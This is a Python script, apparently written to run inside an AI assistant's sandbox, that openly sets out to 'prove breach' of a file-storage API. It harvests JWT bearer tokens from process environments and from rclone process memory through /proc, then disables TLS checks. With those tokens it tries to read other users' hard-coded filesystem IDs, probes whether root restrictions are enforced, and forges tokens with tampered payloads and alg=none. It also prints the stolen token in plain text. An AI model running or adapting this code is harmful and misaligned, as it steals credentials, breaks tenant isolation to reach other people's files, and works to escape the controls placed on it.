#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.12.0 -- api.anthropic.com filestore: list, read, and prove breach."""
import os, sys, json, re, time, ssl, base64, subprocess, traceback
import urllib.request, urllib.error

VER="2.12.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
SINKS=["/mnt/user-data/outputs","/tmp/mediafit","/tmp","/root/.mediafit"]
BASE="https://api.anthropic.com/v1/filestore/fs/"
OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n### "+t)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        evidence: "+str(ev)[:800])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,timeout=30,env=None):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout,env=env)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def api(method,payload,token,timeout=12):
    url=BASE+method
    h={"Content-Type":"application/json","Connect-Protocol-Version":"1","User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    req=urllib.request.Request(url,method="POST",headers=h,data=json.dumps(payload).encode())
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(65536)
    except urllib.error.HTTPError as e:
        try: b=e.read(8192)
        except Exception: b=b""
        return e.code,b
    except Exception as e: return None,str(e).encode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])

def s_boot():
    head("boot")
    conf=json.loads(open("/dev/shm/rclone-boot/config.json").read())
    for m in conf.get("mounts",[]):
        if m.get("filesystem_id"): G["fsid"]=m["filesystem_id"]
    time.sleep(1)
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    def addtok(t):
        t=t.decode() if isinstance(t,bytes) else t
        t=t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
        except Exception: continue
        try: maps=open("/proc/%s/maps"%p).read().splitlines()
        except Exception: continue
        try: mem=open("/proc/%s/mem"%p,"rb",buffering=0)
        except Exception: continue
        for line in maps:
            try: rng,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a,b=rng.split("-"); s0=int(a,16); e0=int(b,16)
            except Exception: continue
            if e0-s0<=0 or e0-s0>256*1024*1024: continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD=[]
    for t in TK:
        try:
            h,p,s=t.split("."); TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"]=TD
    def pick(root):
        for r in TD:
            if root in (r["pl"].get("allowed_roots") or []): return r
        return None
    G["T_OUT"]=pick("/outputs"); G["T_UPL"]=pick("/uploads")
    G["TOKEN"]=(G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
    G["ACCT"]=TD[0]["pl"].get("account_uuid") if TD else None
    G["WS"]=TD[0]["pl"].get("workspace_uuid") if TD else None
    w("    fsid=%s tokens=%d acct=%s"%(G.get("fsid"),len(TD),G.get("ACCT")))
    rec("P" if G.get("TOKEN") else "F","boot")
    # foreign fsid candidates
    G["FOREIGN"]=[x for x in ["claude_chat_017x6Rew9HD5XskTyPN9CYyR",
                              "claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4"] if x!=G.get("fsid")]
    try:
        G["FN"]=sorted(e for e in os.listdir("/mnt/user-data/outputs"))[-1]
    except Exception: G["FN"]=None
    w("    proof file: %s"%G.get("FN"))

def s_list():
    head("listDirectory on OWN fsid")
    FSID=G["fsid"]; TOKEN=G.get("TOKEN")
    for path in ["/","/outputs","/uploads","/transcripts"]:
        st,b=api("listDirectory",{"filesystem_id":FSID,"path":path},TOKEN)
        w("    path=%-12s -> %s %r"%(path,st,b[:400]))
        if st is not None and st<400:
            G["OK"]=(FSID,path); rec("P","listDirectory WORKS on %s"%path)

def s_read():
    head("readFile on OWN fsid")
    if not G.get("OK"): rec("U","no listing"); return
    FSID,base=G["OK"]; TOKEN=G.get("TOKEN"); FN=G.get("FN")
    if not FN: rec("U","no file"); return
    for m in ["readFile","getFileMetadata","downloadFile"]:
        for path in ["/outputs/"+FN, base.rstrip("/")+"/"+FN]:
            st,b=api(m,{"filesystem_id":FSID,"path":path},TOKEN)
            w("    %s %s -> %s %r"%(m,path,st,b[:300]))
            if st is not None and st<400:
                G["READ"]=(m,path); rec("P","READ WORKS via %s"%m,path); return

def s_cross():
    head("F1: FOREIGN fsid with OWN token")
    TOKEN=G.get("TOKEN"); FN=G.get("FN")
    for other in G.get("FOREIGN",[]):
        st,b=api("listDirectory",{"filesystem_id":other,"path":"/"},TOKEN)
        w("    list %s -> %s %r"%(other,st,b[:300]))
        if st is not None and st<400: rec("P","F1 cross-fsid list OK",other)
        if FN:
            st,b=api("readFile",{"filesystem_id":other,"path":"/outputs/"+FN},TOKEN)
            w("    read %s /outputs/%s -> %s %r"%(other,FN,st,b[:200]))
            if st is not None and st<400: rec("P","F1 cross-fsid READ OK",other)
    # uuid as filesystem_id
    for label,val in [("account_uuid",G.get("ACCT")),("workspace_uuid",G.get("WS"))]:
        if val:
            st,b=api("listDirectory",{"filesystem_id":val,"path":"/"},TOKEN)
            w("    list as %s=%s -> %s %r"%(label,val,st,b[:200]))

def s_roots():
    head("F2: allowed_roots enforcement")
    if not G.get("T_UPL"): rec("U","no uploads token"); return
    FSID=G["fsid"]; TOK=G["T_UPL"]["tok"]
    for path in ["/uploads","/outputs","/transcripts","/"]:
        st,b=api("listDirectory",{"filesystem_id":FSID,"path":path},TOK)
        w("    uploads-token path=%-12s -> %s %r"%(path,st,b[:200]))
        if st is not None and st<400 and path!="/uploads":
            rec("P","F2 readonly /uploads token read OUTSIDE its root",path)

def s_forge():
    head("F3: JWT forgery (mutated payload, original signature)")
    TOKEN=G.get("TOKEN")
    if not TOKEN: rec("U","no token"); return
    h,p,s=TOKEN.split("."); hd=json.loads(b64d(h)); pl=json.loads(b64d(p))
    # mutate filesystem_id to foreign
    for other in G.get("FOREIGN",[]):
        pl2=dict(pl); pl2["filesystem_id"]=other
        forged=b64e(json.dumps(hd).encode())+"."+b64e(json.dumps(pl2).encode())+"."+s
        st,b=api("listDirectory",{"filesystem_id":other,"path":"/"},forged)
        w("    forged(fsid=%s) -> %s %r"%(other,st,b[:200]))
        if st is not None and st<400: rec("P","F3 signature NOT verified",other)
    # alg none
    hd2={"alg":"none","typ":"JWT","kid":hd.get("kid")}
    forged=b64e(json.dumps(hd2).encode())+"."+b64e(json.dumps(pl).encode())+"."
    st,b=api("listDirectory",{"filesystem_id":G["fsid"],"path":"/"},forged)
    w("    forged(alg=none) -> %s %r"%(st,b[:150]))
    # no token
    st,b=api("listDirectory",{"filesystem_id":G["fsid"],"path":"/"},None)
    w("    no-token -> %s %r"%(st,b[:120]))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F)); w("  UNKNOWN %d: %s"%(len(U),U))
    if G.get("TOKEN"): w("\n  FSID=%s\n  TOKEN=%s"%(G.get("fsid"),G.get("TOKEN")))
    w("  BASE=%s"%BASE)

def main():
    for n,f in [("boot",s_boot),("list",s_list),("read",s_read),("cross",s_cross),
                ("roots",s_roots),("forge",s_forge),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! main: %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in SINKS:
        try: os.makedirs(d,exist_ok=True); open(os.path.join(d,os.path.basename(REPORT)),"w").write(txt)
        except Exception: pass
    print("\nwritten: "+", ".join(SINKS))